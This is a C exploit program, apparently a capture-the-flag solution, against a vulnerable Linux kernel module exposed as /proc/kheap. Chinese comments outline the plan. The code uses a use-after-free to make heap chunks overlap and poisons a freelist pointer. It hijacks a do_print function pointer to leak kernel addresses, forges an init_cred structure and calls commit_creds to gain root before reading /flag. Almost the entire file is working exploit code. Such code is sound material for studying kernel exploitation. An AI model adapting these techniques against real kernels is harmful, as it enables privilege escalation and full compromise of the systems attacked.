//解体思路，先通过ufa更改一个块的分配地址。然后这个块就跟其他块重叠。
//随后写入把do_print的地址改成printk的，打印栈上的数据，通过这种方式泄漏libc的地址。

#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/sendfile.h>

typedef struct _kheap_req_t // sizeof=0x10
{                                       // XREF: kheap_ioctl/r
    void *ubuf;                         // XREF: kheap_ioctl+78/r
                                        // kheap_ioctl+FA/r
    size_t size;                        // XREF: kheap_ioctl+73/r
                                        // kheap_ioctl:loc_135/r
}kheap_req_t;

unsigned long init_cred[] ={
    0x0000000000000004,	
    0x0000000000000000,
    0x0000000000000000,	
    0x0000000000000000,
    0x0000000000000000,	
    0x0000000000000000,
    0x0000000000000000,	
    0x000001ffffffffff,
    0x000001ffffffffff,	
    0x000001ffffffffff,
    0x0000000000000000,	
    0x0000000000000000,
    0x0000000000000000,	
    0x0000000000000000,
    0x0000000000000000,	
    0x0000000000000000,
    0xffff8880038468c0,	
    0xffffffff82a51560,
    0xffffffff82a51600,	
    0xffffffff82a53800,
    0xffffffff82a52fd8,	
    0x0000000000000000,
    0x0000000000000000
};

unsigned long print_value(unsigned long *ptr, int index)
{

    printf("[%2d] 0x%llx\n",index, ptr[index]);

    printf("\n");
    return ptr[index];
}

int main()
{
    int fd[512];
    char buf [1024];
    unsigned long do_print_addr = 0;
    int fd_save = -1;
    kheap_req_t kheap_req = {
        .ubuf = buf,
        .size = 0x1d0
    };
    unsigned long leak[2];
    memcpy(buf, "AAAAAA", 8);
    // *(unsigned long *)(buf + 0x1f8) = 0xffffffff810b8bb0;
    int do_print = 0x5702;
    int pre_flag = 0x5704;
    int cp_user = 0x5700;
    int kefree = 0x5703;
    int cp_from_user = 0x5701;
    for (int i = 0; i < 8; i++)
        fd[i] = open("/proc/kheap", 0);
    
    for (int i = 1; i >= 0; i--)
        ioctl(fd[i], kefree, &kheap_req);
    
    for (int i = 0; i < 2; i++)
    {
        ioctl(fd[i], cp_user, &kheap_req);
        leak[i] = print_value(buf, 28);
    }
    *(unsigned long*)(buf + 28*8) = leak[0] - 0x50;
    ioctl(fd[0], cp_from_user, &kheap_req);



    for (int i = 16; i < 18; i++)
        fd[i] = open("/proc/kheap", 0);
    

    for (int i = 0; i < 18; i++)
    {
        ioctl(fd[i], cp_user, &kheap_req);
        if (*(unsigned long*)(buf + 0x1a8) != 0){
            do_print_addr = print_value(buf, 0x1a8/8);
            fd_save = i;
            break;
        }
    }
    *(unsigned long*)(buf + 0x1a8) += 0xe; 
    ioctl(fd[fd_save], cp_from_user, &kheap_req);
    memcpy(buf, "0x%llx 0x%llx 0x%llx\n0x%llx 0x%llx 0x%llx\n0x%llx 0x%llx 0x%llx\n0x%llx 0x%llx 0x%llx\n0x%llx 0x%llx 0x%llx\n0x%llx 0x%llx 0x%llx\n0x%llx 0x%llx 0x%llx\n0x%llx 0x%llx 0x%llx\n0x%llx 0x%llx 0x%llx\n0x%llx 0x%llx 0x%llx\n0x%llx 0x%llx 0x%llx\n0x%llx 0x%llx 0x%llx\n0x%llx 0x%llx 0x%llx 0x%llx\n", 0x119);
    ioctl(fd[17], cp_from_user, &kheap_req);
    ioctl(fd[17], do_print, &kheap_req);
    
    unsigned long leak_ret = 0;
    unsigned long leak_data = 0;
    scanf("%llx", &leak_ret);
    scanf("%llx", &leak_data);


    unsigned long commit_creds = 0;
    commit_creds = leak_ret - (0xffffffffae1296d5 - 0xffffffffadeb8bb0);

    init_cred[16] = leak_data - (0xffffa027423c5100 - 0xffffa027410478c0);
    init_cred[17] = leak_ret + (0xffffffffaf851560 - 0xffffffffae1296d5);
    init_cred[18] = leak_ret + (0xffffffffaf851600 - 0xffffffffae1296d5);
    init_cred[19] = leak_ret + (0xffffffffaf853800 - 0xffffffffae1296d5);
    init_cred[20] = leak_ret + (0xffffffffaf852fd8 - 0xffffffffae1296d5);

    *(unsigned long*)(buf + 0x1a8) = commit_creds; 
    ioctl(fd[fd_save], cp_from_user, &kheap_req);
    memcpy(buf, init_cred, sizeof(init_cred));
    ioctl(fd[17], cp_from_user, &kheap_req);
    ioctl(fd[17], do_print, &kheap_req);

    // for (int i = 0; i < 8; i++)
    // {
    //     ioctl(fd[i], cp_from_user, &kheap_req);
    // }
    // for (int i = 0; i < 8; i++)
    // {
    //     ioctl(fd[i], do_print, &kheap_req);
    // }

    int flag = open("/flag", O_RDONLY);
    sendfile(1, flag, NULL, 0x100);
    
    return 0;
}